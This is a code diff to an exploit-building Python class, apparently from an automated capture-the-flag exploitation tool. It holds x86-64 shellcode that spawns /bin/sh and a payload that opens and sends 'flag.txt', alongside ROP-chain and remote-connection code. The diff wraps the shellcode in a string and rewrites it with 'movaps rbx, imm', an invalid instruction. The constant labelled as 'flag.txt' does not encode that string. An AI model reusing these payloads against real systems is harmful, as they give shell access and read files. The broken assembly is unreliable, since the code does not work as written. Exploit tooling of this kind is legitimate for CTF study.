@@ -10,21 +10,23 @@ from rage.log import aegis_log
 
 class Against:
     """Class for dealing with exploiting the binary."""
+
+    """ 
     # execve("/bin/sh\x00", 0,0)
-    shellcode = asm("""
-        mov rbx, 0x68732f6e69622f
+    shellcode = asm(
+        movaps rbx, 0x68732f6e69622f
         push rbx
         mov eax, 0x3b
         xor rsi, rsi
         xor rdx, rdx
         mov rdi, rsp
         syscall
-    """)
+    )
 
     # open("flag.txt", 0)
     # sendfile(0, 3, 0, 60)
-    opsf_shellcode = asm("""
-        mov rbx, 0x7616c666478747e2
+    opsf_shellcode = asm(
+        movaps rbx, 0x7616c666478747e2
         push rbx
         mov eax, 0x2
         xor rsi, rsi
@@ -36,8 +38,8 @@ class Against:
         xor rdx, rdx
         mov r10, 0x40
         syscall
-    """)
-
+    )
+    """
     def __init__(self, binary_path, libc, machine: Machine, ip, port):
         """Create the against class."""
 
@@ -89,6 +91,8 @@ class Against:
 
         if option == "REMOTE" and self.ip != None and self.port != None:
             return remote(self.ip, self.port)
+        elif option == "REMOTE" and self.ip != None and self.port == None:
+            return remote(self.ip, 443, ssl=True, sni=self.ip)
         elif option == "GDB":
             self.debug = True
             return gdb.debug(self.binary, gdbscript=gs)
@@ -99,7 +103,12 @@ class Against:
         """Return a rop chain to write a string into the binary."""
         chain = b""
 
-        write_gadget, reg1, reg2 = self.machine.find_write_gadget()
+        write_gadgets = self.machine.find_write_gadget()
+
+        if write_gadgets == None:
+            return chain 
+
+        write_gadget, reg1, reg2 = write_gadgets
         aegis_log.debug(f"Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
         write_gadget_address = int(write_gadget.split(b":")[0],16)
 
